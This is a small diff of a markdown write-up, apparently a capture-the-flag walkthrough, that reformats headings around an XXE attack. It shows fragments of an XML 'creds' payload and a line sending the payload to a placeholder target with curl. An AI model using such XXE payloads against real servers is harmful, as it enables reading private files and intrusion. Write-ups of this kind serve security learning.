@@ -25,9 +25,9 @@ Apparently the website has nothing, but when reviewing the source code we see th
   <user>whitex</user>
 </creds>
 ```
+No need for ```<pass> </pass>```
 
-# No need for <pass> </pass>
-# Final payload
+Final payload:
 
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -39,6 +39,6 @@ Apparently the website has nothing, but when reviewing the source code we see th
 </creds>
 ```
 
-# trigger the payload using curl
+Trigger the payload using curl
 
 ```curl -d @xxe http://ip```
